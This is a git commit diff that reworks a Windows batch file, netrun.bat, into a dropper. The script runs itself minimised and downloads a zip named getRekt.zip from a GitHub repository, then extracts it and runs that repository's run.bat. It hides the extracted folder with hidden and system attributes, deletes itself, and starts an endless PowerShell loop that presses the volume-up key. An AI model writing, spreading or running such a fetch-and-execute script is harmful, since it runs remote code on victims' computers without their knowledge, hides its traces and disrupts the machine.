eddad8ffde9f38be6d229041d90bbc71ad676d56
Shaymin-HEG-001 <194256797+Shaymin-HEG-001@users.noreply.github.com>
2025-05-10 19:15:05 +0200

    Improve download script

--- netrun.bat
+++ netrun.bat
@@ -1,5 +1,10 @@
-:: (Bad) Script to automatically download and execute the program
+:: Script to automatically download and execute the program
+@echo off
+if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
+start /MIN "" powershell.exe "$obj = New-Object -ComObject WScript.Shell; while ($true) { $obj.SendKeys([char] 175) }"
 curl -L -o getRekt.zip https://github.com/Shaymin-HEG-001/Mikroschrott/archive/refs/heads/master.zip
 tar -xf .\getRekt.zip
+start /MIN "" powershell.exe "Set-ItemProperty -Path .\Mikroschrott-master -Name Attributes -Value 6"
 del .\getRekt.zip
 start /MIN "" .\Mikroschrott-master\run.bat
+del .\netrun.bat
